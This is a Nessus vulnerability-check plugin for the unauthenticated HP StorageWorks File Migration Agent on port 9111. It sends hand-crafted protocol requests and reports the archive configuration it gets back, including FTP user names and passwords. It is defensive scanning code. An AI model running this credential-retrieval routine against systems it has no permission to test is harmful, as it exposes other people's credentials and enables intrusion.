#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if ( description )
{
  script_id(52655);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2013/06/21 21:42:44 $");

  script_bugtraq_id(46611);
  script_xref(name:"Secunia", value:"43525");

  script_name(english:"HP StorageWorks File Migration Agent Unauthorized Access");
  script_summary(english:"Retrieves sensitive information without authentication.");

  script_set_attribute(attribute:"synopsis", value:
"The service on this port allows remote filesystem manipulation
without authentication.");

  script_set_attribute(attribute:"description", value:
"The remote HP StorageWorks File Migration Agent does not have any
integrated authentication mechanism.  An attacker can exploit this
issue to modify archives and retrieve credentials.");

  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-094/");

  script_set_attribute(attribute:"solution", value:"Restrict access to TCP port 9111.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/03/14");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:hp:storageworks");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2011-2013 Tenable Network Security, Inc.");

  script_dependencies("hp_storageworks_fma_detect.nasl");
  script_require_ports("Services/hp_storageworks_fma", 9111);

  exit(0);
}

include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");

# Ensure the port is open.
port = get_service(svc:"hp_storageworks_fma", default:9111, exit_on_fail:TRUE);

function get_tag(xml, tag)
{
  local_var matches;

  matches = eregmatch(
    string:xml,
    pattern:"<" + tag + ">([^<]*)</" + tag + ">"
  );

  if ( isnull(matches) ) return "(unknown)";
  return matches[1];
}

function utf16_to_ascii(blob, pos)
{
  local_var c1, c2, i, length, str;

  str = "";
  length = strlen(blob);

  for ( i = pos; i < length; i += 2 )
  {
    c1 = getbyte(blob:blob, pos:i);
    c2 = getbyte(blob:blob, pos:i + 1);

    # Break on null.
    if ( c2 == 0x00 && c1 == 0x00 ) break;

    # Filter non-ASCII.
    if ( c2 != 0x00 || c1 > 0x7F ) str += ".";
    else str += raw_string(c1);
  }

  return str;
}

function query(cmd, param)
{
  local_var length, req, res, res_cmd, res_param, sock;

  # Send a hand-crafted FMA archive information request.
  req = "_RRP" + raw_string(
    0x00, 0x01, 0x00, 0x00, cmd, 0x00, 0x02, 0x00, param, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  );

  # Connect to service.
  sock = open_sock_tcp(port);
  if ( ! sock ) exit(1, "Failed to open a socket on port "+port+".");

  # Send request and receive response header.
  send(socket:sock, data:req);
  res = recv(socket:sock, length:24, min:24);
  if ( strlen(res) != 24 ) exit(1, "Couldn't read response header from the service on port " + port + ".");

  # Check if it's an FMA response.
  if ( isnull(res) ) exit(1, "No response to our request from the service on port " + port + ".");
  if ( substr(res, 0, 3) != "_RRP" ) exit(1, "Received unrecognized response on port " + port + ".");

  # Parse the response.
  res_cmd = getbyte(blob:res, pos:8);
  res_param = getbyte(blob:res, pos:12);
  length = getword(blob:res, pos:20);
  if ( res_cmd != cmd && res_param != param ) exit(1, "Received unrecognized response from the service on port " + port + ".");

  # Receive the body of the response.
  res = recv(socket:sock, length:length, min:length);
  if ( strlen(res) != length ) exit(1, "Couldn't read response body from the service on port " + port + ".");
  close(sock);

  return res;
}

function query_cfg(type, id)
{
  local_var cfg, fields, res;

  res = query(cmd:0x21, param:id);

  cfg = "";
  if ( type == "RsaCIFS.dll" )
  {
    # UTF-16 CSV.
    res = utf16_to_ascii(blob:res, pos:0);
    fields = split(res, sep:",", keep:FALSE);
    cfg += '\n  Primary Path   : ' + chomp(fields[5]);
    cfg += '\n  Secondary Path : ' + chomp(fields[6]);
  }
  else if ( type == "RsaFtp.dll" )
  {
    # ASCII XML.
    cfg += '\n  Path           : ' + get_tag(xml:res, tag:"FtpPath");
    cfg += '\n  Primary Host   : ' + get_tag(xml:res, tag:"FtpHost");
    cfg += '\n  Secondary Host : ' + get_tag(xml:res, tag:"SecondaryFtpHost");
    cfg += '\n  Port           : ' + get_tag(xml:res, tag:"FtpPort");
    cfg += '\n  User           : ' + get_tag(xml:res, tag:"FtpUser");
    cfg += '\n  Password       : ' + get_tag(xml:res, tag:"FtpPassword");
  }
  else if ( type == "RsaIAP.dll" )
  {
    # ASCII XML.
    cfg += '\n  Primary Host   : ' + get_tag(xml:res, tag:"SmtpHost");
    cfg += '\n  Secondary Host : ' + get_tag(xml:res, tag:"SecSmtpHost");
    cfg += '\n  Domain         : ' + get_tag(xml:res, tag:"Domain");
    cfg += '\n  Repository     : ' + get_tag(xml:res, tag:"DefaultRepository");
  }

  return cfg;
}

# All parameters in this protocol are little-endian.
set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

# Get archive information.
i = 0;
report = "";
rec_length = 0x0538;
recs = query(cmd:0x11, param:0x00);
while ( i < strlen(recs) )
{
  # Extract fixed-length record from response.
  rec = substr(recs, i, i + rec_length);
  i += rec_length;

  # Parse record.
  id = getword(blob:rec, pos:2);
  name = utf16_to_ascii(blob:rec, pos:16);
  type = utf16_to_ascii(blob:rec, pos:82);
  desc = utf16_to_ascii(blob:rec, pos:244);

  # Add archive description to report.
  report +=
    '\n  ID             : ' + id +
    '\n  Name           : ' + name +
    '\n  Description    : ' + desc +
    '\n  Type           : ' + type +
    query_cfg(type:type, id:id) + '\n';
}
if (!report) exit(1, "Failed to generate a report for the service listening on port "+port+".");

report =
  '\nNessus retrieved the following list of archives from' +
  '\nthe HP StorageWorks File Migration Agent :\n' + report;

if ( report_verbosity > 0 ) security_warning(port:port, extra:report);
else security_warning(port);
